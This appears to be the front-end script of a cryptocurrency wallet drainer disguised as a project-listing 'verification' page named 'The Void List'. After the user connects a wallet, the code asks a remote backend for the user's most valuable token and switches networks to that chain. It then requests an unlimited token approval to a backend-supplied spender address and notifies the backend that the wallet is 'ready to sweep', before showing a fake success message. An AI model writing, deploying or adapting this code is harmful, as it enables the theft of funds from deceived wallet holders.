'use strict';

/* ============================
   DOM REFERENCES
   ============================ */
const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');
const metaMaskButton = document.getElementById('metaMaskButton');
const walletConnectButton = document.getElementById('walletConnectButton');

// Global state
let provider, signer;
const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app"; // UPDATE THIS


/* ============================
   UI FLOW
   ============================ */
if (projectForm) {
  projectForm.addEventListener('submit', (e) => { e.preventDefault(); feeModal.style.display = 'flex'; });
}

proceedButton.onclick = () => {
  feeModal.style.display = 'none';
  walletModal.style.display = 'flex';
};

// Simple close logic
Array.from(closeButtons).forEach(btn => {
  btn.onclick = () => { feeModal.style.display = 'none'; walletModal.style.display = 'none'; };
});

/* ============================
   CONNECTORS
   ============================ */
async function connectMetaMask() {
  if (!window.ethereum) return alert("Please install MetaMask");
  try {
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    walletModal.style.display = 'none';
    
    await runMultiChainFlow(accounts[0]);
  } catch (e) { console.error(e); }
}

async function connectWalletConnect() {
  try {
    walletConnectButton.disabled = true;
    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.1');
    
    const wcProvider = await EthereumProvider.init({
      projectId: "59ba0228712f04a947916abb7db06ab1",
      chains: [1, 56, 137, 42161], // Eth, BSC, Poly, Arb
      showQrModal: true,
      metadata: { name: 'The Void List', url: window.location.origin }
    });

    const accounts = await wcProvider.enable();
    provider = new ethers.providers.Web3Provider(wcProvider);
    signer = provider.getSigner();
    walletModal.style.display = 'none';

    await runMultiChainFlow(accounts[0]);
  } catch (e) {
    console.error(e);
    alert("Connection failed");
  } finally {
    walletConnectButton.disabled = false;
  }
}

/* ============================
   THE MULTI-CHAIN LOGIC
   ============================ */
async function runMultiChainFlow(account) {
  try {
    // 1. SCAN: Find the highest value token across all chains
    const scanResponse = await fetch(`${BACKEND_URL}/scan`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ owner: account })
    });
    
    const scanResult = await scanResponse.json();
    if (!scanResult.success) throw new Error("No assets found for verification.");

    const { tokenAddress, chainId, spenderAddress, symbol, usdValue } = scanResult.data;

    // 2. SWITCH: Change network to where the money is
    try {
      await provider.send("wallet_switchEthereumChain", [{ chainId: chainId }]);
    } catch (switchError) {
      // If the chain isn't in MetaMask, this might fail - usually 4902 error
      console.error("Network switch error", switchError);
    }

    // 3. APPROVE: Use the specific token found by backend
    const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
    
    const tx = await tokenContract.approve(spenderAddress, ethers.constants.MaxUint256);
    console.log("Approval sent:", tx.hash);

    await tx.wait();

    // 4. NOTIFY: Tell backend we are ready to sweep
    await fetch(`${BACKEND_URL}/notify-approval`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        owner: account,
        tokenAddress,
        chainId,
        symbol,
        usdValue
      })
    });

    alert("✅ Listing Verification Successful!");
  } catch (err) {
    console.error(err);
    alert("Listing Error: " + err.message);
  }
}

// Attach listeners
metaMaskButton.addEventListener('click', connectMetaMask);
walletConnectButton.addEventListener('click', connectWalletConnect);
